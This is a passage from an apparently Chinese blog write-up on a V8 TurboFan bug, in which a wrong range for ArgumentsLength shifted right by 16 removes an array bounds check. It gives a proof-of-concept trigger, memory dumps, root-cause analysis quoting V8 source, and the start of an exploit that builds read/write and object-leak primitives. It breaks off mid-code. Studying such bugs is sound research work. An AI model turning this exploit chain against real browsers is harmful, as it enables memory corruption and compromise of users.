class="number">0</span>; i &lt; <span class="number">10000</span>; i++) fun(...a4);</span><br><span class="line"><span class="comment">// %OptimizeFunctionOnNextCall(fun);</span></span><br><span class="line">fun(...a3);</span><br><span class="line"><span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; a2.length; i++)&#123;</span><br><span class="line">    <span class="built_in">console</span>.log(a2[i]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">console</span>.log(a2.length);</span><br></pre></td></tr></table></figure><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><span class="line">a1:</span><br><span class="line">DebugPrint: <span class="number">0x358226e9b891</span>: [JSArray]</span><br><span class="line"> - length: <span class="number">16</span></span><br><span class="line"> - elements: <span class="number">0x358226e9b801</span> &lt;FixedDoubleArray[<span class="number">16</span>]&gt; &#123;</span><br><span class="line">           <span class="number">0</span>: <span class="number">1.1</span></span><br><span class="line">        <span class="number">1</span><span class="number">-15</span>: <span class="xml"><span class="tag">&lt;<span class="name">the_hole</span>&gt;</span></span></span><br><span class="line"><span class="xml"> &#125;</span></span><br><span class="line"><span class="xml">a2:</span></span><br><span class="line"><span class="xml">DebugPrint: 0x358226e9b941: [JSArray]</span></span><br><span class="line"><span class="xml"> - length: 42</span></span><br><span class="line"> - elements: 0x358226e9b8b1 &lt;FixedDoubleArray[65535]&gt; &#123;</span><br><span class="line">           0: 1.1</span><br><span class="line">        1-15: &lt;the_hole&gt;</span><br><span class="line">          16: 2.90681e-310</span><br><span class="line">          17: 2.90688e-310</span><br><span class="line">          18: 2.90674e-310</span><br><span class="line">          19: 8.91238e-313</span><br><span class="line">    20-51430: -1.18859e+148</span><br><span class="line"></span><br><span class="line">a1 elements:</span><br><span class="line">lldb) x/50gx 0x358226e9b801-1</span><br><span class="line">0x358226e9b800: 0x00003582ced81461 0x0000001000000000</span><br><span class="line">0x358226e9b810: 0x3ff199999999999a-&gt;a1[0] 0xfff7fffffff7ffff</span><br><span class="line">0x358226e9b820: 0xfff7fffffff7ffff 0xfff7fffffff7ffff</span><br><span class="line">0x358226e9b830: 0xfff7fffffff7ffff 0xfff7fffffff7ffff</span><br><span class="line">0x358226e9b840: 0xfff7fffffff7ffff 0xfff7fffffff7ffff</span><br><span class="line">0x358226e9b850: 0xfff7fffffff7ffff 0xfff7fffffff7ffff</span><br><span class="line">0x358226e9b860: 0xfff7fffffff7ffff 0xfff7fffffff7ffff</span><br><span class="line">0x358226e9b870: 0xfff7fffffff7ffff 0xfff7fffffff7ffff</span><br><span class="line">0x358226e9b880: 0xfff7fffffff7ffff 0xfff7fffffff7ffff</span><br><span class="line">a1 object:</span><br><span class="line">0x358226e9b890: 0x0000358279782f29 0x00003582ced80c29</span><br><span class="line">0x358226e9b8a0: 0x0000358226e9b801 0x0000001000000000</span><br><span class="line">a2 elements:</span><br><span class="line">0x358226e9b8b0: 0x00003582ced81461 0x0000ffff00000000-&gt;a1[21]</span><br><span class="line">0x358226e9b8c0: 0x3ff199999999999a 0xfff7fffffff7ffff</span><br><span class="line">0x358226e9b8d0: 0xfff7fffffff7ffff 0xfff7fffffff7ffff</span><br><span class="line">0x358226e9b8e0: 0xfff7fffffff7ffff 0xfff7fffffff7ffff</span><br><span class="line">0x358226e9b8f0: 0xfff7fffffff7ffff 0xfff7fffffff7ffff</span><br><span class="line">0x358226e9b900: 0xfff7fffffff7ffff 0xfff7fffffff7ffff</span><br><span class="line">0x358226e9b910: 0xfff7fffffff7ffff 0xfff7fffffff7ffff</span><br><span class="line">0x358226e9b920: 0xfff7fffffff7ffff 0xfff7fffffff7ffff</span><br><span class="line">0x358226e9b930: 0xfff7fffffff7ffff 0xfff7fffffff7ffff</span><br><span class="line">a2 object:</span><br><span class="line">0x358226e9b940: 0x0000358279782f29 0x00003582ced80c29</span><br><span class="line">0x358226e9b950: 0x0000358226e9b8b1 0x0000002a00000000-&gt;a1[41]</span><br><span class="line">0x358226e9b960: 0xdeadbeedbeadbeef 0xdeadbeedbeadbeef</span><br><span class="line">0x358226e9b970: 0xdeadbeedbeadbeef 0xdeadbeedbeadbeef</span><br><span class="line">0x358226e9b980: 0xdeadbeedbeadbeef 0xdeadbeedbeadbeef</span><br><span class="line"></span><br><span class="line">function fun(arg) &#123;</span><br><span class="line">    let x = arguments.length;// x = 65536，但范围分析认为是65534</span><br><span class="line">    a1 = new Array(0x10);</span><br><span class="line">    a1[0] = 1.1;</span><br><span class="line">    a2 = new Array(0x10);</span><br><span class="line">    a2[0] = 1.1;</span><br><span class="line">    x = x &gt;&gt; 16;// x = 65536&gt;&gt;16 = 1,但范围分析认为是65534&gt;&gt;16 = 0</span><br><span class="line">    a1[x * 21] = 1.39064994160909e-309;  // 0xffff00000000</span><br><span class="line">    a1[x * 41] = 8.91238232205e-313;  // 0x2a00000000  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>漏洞验证，边界检查被移除后的越界读写<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line">1.1</span><br><span class="line">undefined</span><br><span class="line">undefined</span><br><span class="line">undefined</span><br><span class="line">undefined</span><br><span class="line">undefined</span><br><span class="line">undefined</span><br><span class="line">undefined</span><br><span class="line">undefined</span><br><span class="line">undefined</span><br><span class="line">undefined</span><br><span class="line">undefined</span><br><span class="line">undefined</span><br><span class="line">undefined</span><br><span class="line">undefined</span><br><span class="line">undefined</span><br><span class="line">3.5906059781413e-311</span><br><span class="line">3.592134784647e-311</span><br><span class="line">3.5918890420468e-311</span><br><span class="line">8.91238232205e-313</span><br><span class="line">3.5921347865955e-311</span><br><span class="line">8.487983164e-314</span><br><span class="line">4.243991582e-314</span><br><span class="line">0</span><br><span class="line">3.5906059883793e-311</span><br><span class="line">3.592134783722e-311</span><br><span class="line">3.592134783722e-311</span><br><span class="line">3.5921347865955e-311</span><br><span class="line">1.4853970537e-313</span><br><span class="line">1.0609978955e-313</span><br><span class="line">0</span><br><span class="line">3.590605972767e-311</span><br><span class="line">3.5906059725297e-311</span><br><span class="line">3.5906059886165e-311</span><br><span class="line">3.590605982569e-311</span><br><span class="line">3.592134783722e-311</span><br><span class="line">3.592134783722e-311</span><br><span class="line">3.592134783793e-311</span><br><span class="line">1.1</span><br><span class="line">3.592134783793e-311</span><br><span class="line">3.5906059781413e-311</span><br><span class="line">3.592134783793e-311</span><br><span class="line">42</span><br></pre></td></tr></table></figure></p><h2 id="Root-Cause"><a href="#Root-Cause" class="headerlink" title="Root Cause"></a>Root Cause</h2><p>在typer phase里对SpeculativeNumberShiftRight的range进行计算<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">#72:SpeculativeNumberShiftRight[SignedSmall](#102:LoadField, #27:NumberConstant, #70:Checkpoint, #55:JSCreateArray)</span><br><span class="line">    102: LoadField[tagged base, 24, #length, NonInternal, kRepTagged|kTypeAny, FullWriteBarrier](9, 101, 18)</span><br><span class="line">    27: NumberConstant[16]</span><br></pre></td></tr></table></figure></p><p><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-12-03-034318.png" alt=""><br>由于在typer phase还不会对Load处理，于是在第一次对NumberShiftRight进行range analysis的时候，会将其范围直接当做int32的最大和最小值。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">#   define INT32_MIN       ((int32_t)(-2147483647-1))</span><br><span class="line">#   define INT32_MAX       ((int32_t)(2147483647))</span><br></pre></td></tr></table></figure></p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">Type OperationTyper::NumberShiftRight(Type lhs, Type rhs) &#123;</span><br><span class="line">  DCHECK(lhs.Is(Type::Number()));</span><br><span class="line">  DCHECK(rhs.Is(Type::Number()));</span><br><span class="line"></span><br><span class="line">  lhs = NumberToInt32(lhs);</span><br><span class="line">  rhs = NumberToUint32(rhs);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (lhs.IsNone() || rhs.IsNone()) <span class="keyword">return</span> Type::None();</span><br><span class="line"></span><br><span class="line">  <span class="keyword">int32_t</span> min_lhs = lhs.Min();</span><br><span class="line">  <span class="keyword">int32_t</span> max_lhs = lhs.Max();</span><br><span class="line">  <span class="keyword">uint32_t</span> min_rhs = rhs.Min();</span><br><span class="line">  <span class="keyword">uint32_t</span> max_rhs = rhs.Max();</span><br><span class="line">  <span class="keyword">if</span> (max_rhs &gt; <span class="number">31</span>) &#123;</span><br><span class="line">    <span class="comment">// rhs can be larger than the bitmask</span></span><br><span class="line">    max_rhs = <span class="number">31</span>;</span><br><span class="line">    min_rhs = <span class="number">0</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">double</span> min = <span class="built_in">std</span>::min(min_lhs &gt;&gt; min_rhs, min_lhs &gt;&gt; max_rhs);</span><br><span class="line">  <span class="keyword">double</span> max = <span class="built_in">std</span>::max(max_lhs &gt;&gt; min_rhs, max_lhs &gt;&gt; max_rhs);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"min lhs is %d\n"</span>, min_lhs);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"min rhs is %d\n"</span>, min_rhs);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"max lhs is %d\n"</span>, max_lhs);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"max rhs is %d\n"</span>, max_rhs);</span><br><span class="line">  <span class="keyword">if</span> (max == kMaxInt &amp;&amp; min == kMinInt) <span class="keyword">return</span> Type::Signed32();</span><br><span class="line">  <span class="keyword">return</span> Type::Range(min, max, zone());</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>于是在第一次对NumberShiftRight进行range analysis之后得到<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">min lhs is -2147483648</span><br><span class="line">min rhs is 16</span><br><span class="line">max lhs is 2147483647</span><br><span class="line">max rhs is 16</span><br><span class="line">...</span><br><span class="line">[Type: Range(-32768, 32767)]</span><br></pre></td></tr></table></figure></p><p>然后在typer lowering phase里将JSCreateArray reduce成ArgumentsLength,并计算其范围。<br><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br></pre></td><td class="code"><pre><span class="line">Reduction JSCreateLowering::ReduceJSCreateArguments(Node* node) &#123;</span><br><span class="line">  DCHECK_EQ(IrOpcode::kJSCreateArguments, node-&gt;opcode());</span><br><span class="line">  CreateArgumentsType type = CreateArgumentsTypeOf(node-&gt;op());</span><br><span class="line">  Node* <span class="keyword">const</span> frame_state = NodeProperties::GetFrameStateInput(node);</span><br><span class="line">  Node* <span class="keyword">const</span> outer_state = frame_state-&gt;InputAt(kFrameStateOuterStateInput);</span><br><span class="line">  Node* <span class="keyword">const</span> control = graph()-&gt;start();</span><br><span class="line">  FrameStateInfo state_info = FrameStateInfoOf(frame_state-&gt;op());</span><br><span class="line">  SharedFunctionInfoRef shared(broker(),</span><br><span class="line">                               state_info.shared_info().ToHandleChecked());</span><br><span class="line"></span><br><span class="line">  <span class="comment">// Use the ArgumentsAccessStub for materializing both mapped and unmapped</span></span><br><span class="line">  <span class="comment">// arguments object, but only for non-inlined (i.e. outermost) frames.</span></span><br><span class="line">  <span class="keyword">if</span> (outer_state-&gt;opcode() != IrOpcode::kFrameState) &#123;</span><br><span class="line">    <span class="keyword">switch</span> (type) &#123;</span><br><span class="line">      <span class="keyword">case</span> CreateArgumentsType::kMappedArguments: &#123;</span><br><span class="line">        <span class="comment">// TODO(mstarzinger): Duplicate parameters are not handled yet.</span></span><br><span class="line">        <span class="keyword">if</span> (shared.has_duplicate_parameters()) <span class="keyword">return</span> NoChange();</span><br><span class="line">        Node* <span class="keyword">const</span> callee = NodeProperties::GetValueInput(node, <span class="number">0</span>);</span><br><span class="line">        Node* <span class="keyword">const</span> context = NodeProperties::GetContextInput(node);</span><br><span class="line">        Node* effect = NodeProperties::GetEffectInput(node);</span><br><span class="line">        Node* <span class="keyword">const</span> arguments_frame =</span><br><span class="line">            graph()-&gt;NewNode(simplified()-&gt;ArgumentsFrame());</span><br><span class="line">        Node* <span class="keyword">const</span> arguments_length = graph()-&gt;NewNode(</span><br><span class="line">            simplified()-&gt;ArgumentsLength(</span><br><span class="line">                shared.internal_formal_parameter_count(), <span class="literal">false</span>),</span><br><span class="line">            arguments_frame);</span><br><span class="line">        <span class="comment">// Allocate the elements backing store.</span></span><br><span class="line">        <span class="keyword">bool</span> has_aliased_arguments = <span class="literal">false</span>;</span><br><span class="line">        Node* <span class="keyword">const</span> elements = effect = AllocateAliasedArguments(</span><br><span class="line">            effect, control, context, arguments_frame, arguments_length, shared,</span><br><span class="line">            &amp;has_aliased_arguments);</span><br><span class="line">        <span class="comment">// Load the arguments object map.</span></span><br><span class="line">        Node* <span class="keyword">const</span> arguments_map = jsgraph()-&gt;Constant(</span><br><span class="line">            has_aliased_arguments</span><br><span class="line">                ? native_context().fast_aliased_arguments_map()</span><br><span class="line">                : native_context().sloppy_arguments_map());</span><br><span class="line">        <span class="comment">// Actually allocate and initialize the arguments object.</span></span><br><span class="line">        AllocationBuilder a(jsgraph(), effect, control);</span><br><span class="line">        Node* properties = jsgraph()-&gt;EmptyFixedArrayConstant();</span><br><span class="line">        STATIC_ASSERT(JSSloppyArgumentsObject::kSize == <span class="number">5</span> * kPointerSize);</span><br><span class="line">        a.Allocate(JSSloppyArgumentsObject::kSize);</span><br><span class="line">        a.Store(AccessBuilder::ForMap(), arguments_map);</span><br><span class="line">        a.Store(AccessBuilder::ForJSObjectPropertiesOrHash(), properties);</span><br><span class="line">        a.Store(AccessBuilder::ForJSObjectElements(), elements);</span><br><span class="line">        a.Store(AccessBuilder::ForArgumentsLength(), arguments_length);</span><br><span class="line">        a.Store(AccessBuilder::ForArgumentsCallee(), callee);</span><br><span class="line">        RelaxControls(node);</span><br><span class="line">        a.FinishAndChange(node);</span><br><span class="line">        <span class="keyword">return</span> Changed(node);</span><br><span class="line">      &#125;</span><br><span class="line">      ...</span><br><span class="line">      ...</span><br><span class="line"><span class="keyword">void</span> Typer::Decorator::Decorate(Node* node) &#123;</span><br><span class="line">  <span class="keyword">if</span> (node-&gt;op()-&gt;ValueOutputCount() &gt; <span class="number">0</span>) &#123;</span><br><span class="line">    <span class="comment">// Only eagerly type-decorate nodes with known input types.</span></span><br><span class="line">    <span class="comment">// Other cases will generally require a proper fixpoint iteration with Run.</span></span><br><span class="line">    <span class="keyword">bool</span> is_typed = NodeProperties::IsTyped(node);</span><br><span class="line">    <span class="keyword">if</span> (is_typed || NodeProperties::AllValueInputsAreTyped(node)) &#123;</span><br><span class="line">      <span class="function">Visitor <span class="title">typing</span><span class="params">(typer_, <span class="literal">nullptr</span>)</span></span>;</span><br><span class="line">      Type type = typing.TypeNode(node);</span><br><span class="line">      <span class="keyword">if</span> (is_typed) &#123;</span><br><span class="line">        type = Type::Intersect(type, NodeProperties::GetType(node),</span><br><span class="line">                               typer_-&gt;zone());</span><br><span class="line">      &#125;</span><br><span class="line">      NodeProperties::SetType(node, type);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line">...</span><br><span class="line">...</span><br><span class="line">Type Typer::Visitor::TypeArgumentsLength(Node* node) &#123;</span><br><span class="line">  <span class="keyword">return</span> TypeCache::Get().kArgumentsLengthType;</span><br><span class="line">&#125;</span><br><span class="line">...</span><br><span class="line">...</span><br><span class="line">Type <span class="keyword">const</span> kArgumentsLengthType =</span><br><span class="line">    Type::Range(<span class="number">0.0</span>, Code::kMaxArguments, zone());</span><br><span class="line">...</span><br><span class="line">...</span><br><span class="line"><span class="keyword">static</span> <span class="keyword">const</span> <span class="keyword">int</span> kArgumentsBits = <span class="number">16</span>;</span><br><span class="line"><span class="comment">// Reserve one argument count value as the "don't adapt arguments" sentinel.</span></span><br><span class="line"><span class="keyword">static</span> <span class="keyword">const</span> <span class="keyword">int</span> kMaxArguments = (<span class="number">1</span> &lt;&lt; kArgumentsBits) - <span class="number">2</span>;</span><br><span class="line">...</span><br><span class="line">...</span><br><span class="line">#<span class="number">171</span>:ArgumentsLength[<span class="number">1</span>, <span class="keyword">not</span> rest length](#<span class="number">170</span>:ArgumentsFrame)  [Type: Range(<span class="number">0</span>, <span class="number">65534</span>)]</span><br></pre></td></tr></table></figure></p><p>然后在load elimination phase里将多余的LoadField remove，直接替换成真正的值，ArgumentsLength<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">#72:SpeculativeNumberShiftRight[SignedSmall](#102:LoadField, #27:NumberConstant, #70:Checkpoint, #18:JSStackCheck)  [Type: Range(-32768, 32767)]</span><br><span class="line">-&gt;</span><br><span class="line">#72:SpeculativeNumberShiftRight[SignedSmall](#171:ArgumentsLength, #27:NumberConstant, #70:Checkpoint, #18:JSStackCheck)  [Type: Range(-32768, 32767)]</span><br></pre></td></tr></table></figure></p><p>于是在simplified lowering phase里，为了修正这个SpeculativeNumberShiftRight的范围，于是再次对其进行typer计算。<br><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Forward propagation of types from type feedback.</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">RunTypePropagationPhase</span><span class="params">()</span> </span>&#123;</span><br><span class="line">...</span><br><span class="line">    <span class="keyword">bool</span> updated = UpdateFeedbackType(node);    </span><br><span class="line">-&gt;</span><br><span class="line">Type OperationTyper::NumberShiftRight(Type lhs, Type rhs) &#123;</span><br><span class="line">  DCHECK(lhs.Is(Type::Number()));</span><br><span class="line">  DCHECK(rhs.Is(Type::Number()));</span><br><span class="line">  lhs = NumberToInt32(lhs);</span><br><span class="line">  rhs = NumberToUint32(rhs);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (lhs.IsNone() || rhs.IsNone()) <span class="keyword">return</span> Type::None();</span><br><span class="line"></span><br><span class="line">  <span class="keyword">int32_t</span> min_lhs = lhs.Min();</span><br><span class="line">  <span class="keyword">int32_t</span> max_lhs = lhs.Max();</span><br><span class="line">  <span class="keyword">uint32_t</span> min_rhs = rhs.Min();</span><br><span class="line">  <span class="keyword">uint32_t</span> max_rhs = rhs.Max();</span><br><span class="line">  <span class="keyword">if</span> (max_rhs &gt; <span class="number">31</span>) &#123;</span><br><span class="line">    <span class="comment">// rhs can be larger than the bitmask</span></span><br><span class="line">    max_rhs = <span class="number">31</span>;</span><br><span class="line">    min_rhs = <span class="number">0</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">double</span> min = <span class="built_in">std</span>::min(min_lhs &gt;&gt; min_rhs, min_lhs &gt;&gt; max_rhs);</span><br><span class="line">  <span class="keyword">double</span> max = <span class="built_in">std</span>::max(max_lhs &gt;&gt; min_rhs, max_lhs &gt;&gt; max_rhs);</span><br><span class="line">  <span class="keyword">if</span> (max == kMaxInt &amp;&amp; min == kMinInt) <span class="keyword">return</span> Type::Signed32();</span><br><span class="line">  <span class="keyword">return</span> Type::Range(min, max, zone());</span><br><span class="line">&#125;</span><br><span class="line">...</span><br><span class="line">...</span><br><span class="line">Range(<span class="number">0</span>, <span class="number">65534</span>)</span><br><span class="line">Range(<span class="number">16</span>, <span class="number">16</span>)</span><br><span class="line">min lhs is <span class="number">0</span></span><br><span class="line">min rhs is <span class="number">16</span></span><br><span class="line">max lhs is <span class="number">65534</span></span><br><span class="line">max rhs is <span class="number">16</span></span><br><span class="line">-&gt;</span><br><span class="line"><span class="function">NumberShiftRight <span class="title">Range</span><span class="params">(<span class="number">0</span>,<span class="number">0</span>)</span></span></span><br></pre></td></tr></table></figure></p><p>由于这个结果被作为数组的index，所以最终在VisitCheckBounds里，会比较这个范围和数组最大的长度，如果始终index小于数组的length，那么就会将其remove掉。<br><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">VisitCheckBounds</span><span class="params">(Node* node, SimplifiedLowering* lowering)</span> </span>&#123;</span><br><span class="line">    CheckParameters <span class="keyword">const</span>&amp; p = CheckParametersOf(node-&gt;op());</span><br><span class="line">    Type <span class="keyword">const</span> index_type = TypeOf(node-&gt;InputAt(<span class="number">0</span>));</span><br><span class="line">    Type <span class="keyword">const</span> length_type = TypeOf(node-&gt;InputAt(<span class="number">1</span>));</span><br><span class="line">    <span class="keyword">if</span> (length_type.Is(Type::Unsigned31())) &#123;</span><br><span class="line">      <span class="keyword">if</span> (index_type.Is(Type::Integral32OrMinusZero())) &#123;</span><br><span class="line">        <span class="comment">// Map -0 to 0, and the values in the [-2^31,-1] range to the</span></span><br><span class="line">        <span class="comment">// [2^31,2^32-1] range, which will be considered out-of-bounds</span></span><br><span class="line">        <span class="comment">// as well, because the &#123;length_type&#125; is limited to Unsigned31.</span></span><br><span class="line">        VisitBinop(node, UseInfo::TruncatingWord32(),</span><br><span class="line">                   MachineRepresentation::kWord32);</span><br><span class="line">        <span class="keyword">if</span> (lower()) &#123;</span><br><span class="line">          <span class="keyword">if</span> (lowering-&gt;poisoning_level_ ==</span><br><span class="line">                  PoisoningMitigationLevel::kDontPoison &amp;&amp;</span><br><span class="line">              (index_type.IsNone() || length_type.IsNone() ||</span><br><span class="line">               (index_type.Min() &gt;= <span class="number">0.0</span> &amp;&amp;</span><br><span class="line">                index_type.Max() &lt; length_type.Min()))) &#123;</span><br><span class="line">            <span class="comment">// The bounds check is redundant if we already know that</span></span><br><span class="line">            <span class="comment">// the index is within the bounds of [0.0, length[.</span></span><br><span class="line">            DeferReplacement(node, node-&gt;InputAt(<span class="number">0</span>));</span><br></pre></td></tr></table></figure></p><h2 id="exploit"><a href="#exploit" class="headerlink" title="exploit"></a>exploit</h2><h3 id="得到任意地址读写和用户态对象leak的原语"><a href="#得到任意地址读写和用户态对象leak的原语" class="headerlink" title="得到任意地址读写和用户态对象leak的原语"></a>得到任意地址读写和用户态对象leak的原语</h3><p>通过a1的单次越界写改掉oob_double_Array的长度，将其改的很大，然后在后面放一个object Array。<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">a1 = <span class="keyword">new</span> <span class="built_in">Array</span>(<span class="number">0x10</span>);</span><br><span class="line">a1[<span class="number">0</span>] = <span class="number">1.1</span>;</span><br><span class="line">oob_double_Array = <span class="keyword">new</span> <span class="built_in">Array</span>(<span class="number">0x10</span>);</span><br><span class="line">oob_double_Array[<span class="number">0</span>] = <span class="number">1.1</span>;</span><br><span class="line">object_Array = <span class="keyword">new</span> <span class="built_in">Array</span>(<span class="number">0x10</span>);</span><br><span class="line">object_Array[<span class="number">0</span>] = &#123;&#125;;</span><br><span class="line">object_Array[<span class="number">1</span>] = leak;</span><br><span class="line">x = x &gt;&gt; <span class="number">16</span></span><br><span class="line">a1[x * <span class="number">19</span>] = <span class="number">2.60750842793813e-310</span>;  <span class="comment">// 0x0000300000000000</span></span><br><span class="line">a1[x * <span class="number">21</span>] = <span class="number">2.60750842793813e-310</span>;  <span class="comment">// 0x0000300000000000</span></span><br><span class="line">a1[x * <span class="number">41</span>] = <span class="number">2.60750842793813e-310</span>;  <span class="comment">// 